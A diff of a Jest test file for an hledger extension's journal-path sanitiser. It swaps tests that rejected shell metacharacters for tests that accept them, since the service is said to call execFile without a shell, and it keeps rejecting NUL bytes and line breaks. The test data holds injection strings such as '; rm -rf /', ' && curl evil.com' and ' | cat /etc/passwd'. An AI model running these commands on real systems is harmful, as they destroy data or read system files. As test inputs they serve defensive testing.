@@ -207,89 +207,50 @@ describe('HLedgerCliCommands - Command Injection Prevention', () => {
             mockService.dispose();
         });
 
-        it('should reject paths with semicolon', () => {
-            const maliciousPath = `${validJournalPath}; rm -rf /`;
+        // Shell metacharacters are not special here: the service calls
+        // child_process.execFile with an argv array, so no shell ever parses
+        // the path. Rejecting them only refused legitimate names such as
+        // "/Users/me/Taxes (2024)/main.journal".
+        const metacharacterPaths = [
+            '; rm -rf /',
+            ' && curl evil.com',
+            ' | cat /etc/passwd',
+            '`whoami`',
+            '$(whoami)',
+            '()',
+            '[test]',
+            '{test}',
+            '^test',
+            '"test"',
+            '<test',
+            '>test',
+        ];
+
+        it.each(metacharacterPaths)('should accept a path containing %s', (suffix) => {
+            const exoticPath = `${validJournalPath}${suffix}`;
 
             expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
+                (commands as any).sanitizeJournalPath(exoticPath);
+            }).not.toThrow(/cannot appear/);
         });
 
-        it('should reject paths with ampersand', () => {
-            const maliciousPath = `${validJournalPath} && curl evil.com`;
-
+        it('should reject a path with a NUL byte', () => {
             expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
+                (commands as any).sanitizeJournalPath(`${validJournalPath}\u0000x`);
+            }).toThrow(/cannot appear/);
         });
 
-        it('should reject paths with pipe', () => {
-            const maliciousPath = `${validJournalPath} | cat /etc/passwd`;
+        it('should reject a path with a line break', () => {
+            const forgedPath = `${validJournalPath}\n; injected`;
 
             expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with backticks', () => {
-            const maliciousPath = `${validJournalPath}\`whoami\``;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with dollar command substitution', () => {
-            const maliciousPath = `${validJournalPath}$(whoami)`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with parentheses', () => {
-            const maliciousPath = `${validJournalPath}()`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with square brackets', () => {
-            const maliciousPath = `${validJournalPath}[test]`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with curly braces', () => {
-            const maliciousPath = `${validJournalPath}{test}`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with caret', () => {
-            const maliciousPath = `${validJournalPath}^test`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with double quotes', () => {
-            const maliciousPath = `${validJournalPath}"test"`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
+                (commands as any).sanitizeJournalPath(forgedPath);
+            }).toThrow(/cannot appear/);
         });
 
         it('should allow paths with backslash (Windows compatibility)', () => {
-            // Backslash is allowed for Windows path compatibility
-            // The path will be rejected only if it doesn't exist, not as a shell metacharacter
+            // Backslash is an ordinary character here; the path is rejected only
+            // because it does not exist, not as a shell metacharacter.
             const windowsStylePath = `${validJournalPath}\\test`;
 
             expect(() => {
@@ -297,20 +258,11 @@ describe('HLedgerCliCommands - Command Injection Prevention', () => {
             }).toThrow(/does not exist/);
         });
 
-        it('should reject paths with less-than', () => {
-            const maliciousPath = `${validJournalPath}<test`;
+        it('should accept an existing path with parentheses', () => {
+            const parenthesised = path.join(tempDir, 'taxes (2024).journal');
+            fs.writeFileSync(parenthesised, 'test');
 
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
-        });
-
-        it('should reject paths with greater-than', () => {
-            const maliciousPath = `${validJournalPath}>test`;
-
-            expect(() => {
-                (commands as any).sanitizeJournalPath(maliciousPath);
-            }).toThrow(/shell metacharacters/);
+            expect((commands as any).sanitizeJournalPath(parenthesised)).toBe(parenthesised);
         });
 
         it('should reject non-existent paths', () => {
@@ -389,7 +341,7 @@ describe('HLedgerCliCommands - Command Injection Prevention', () => {
 
             expect(() => {
                 (commands as any).getJournalFilePath(mockDocument);
-            }).toThrow(/shell metacharacters/);
+            }).toThrow(/does not exist or is not accessible/);
         });
 
         it('should use valid environment variable path', () => {
@@ -404,7 +356,7 @@ describe('HLedgerCliCommands - Command Injection Prevention', () => {
 
             expect(() => {
                 (commands as any).getJournalFilePath(mockDocument);
-            }).toThrow(/shell metacharacters/);
+            }).toThrow(/does not exist or is not accessible/);
         });
 
         it('should bypass sanitization for trusted document path', () => {
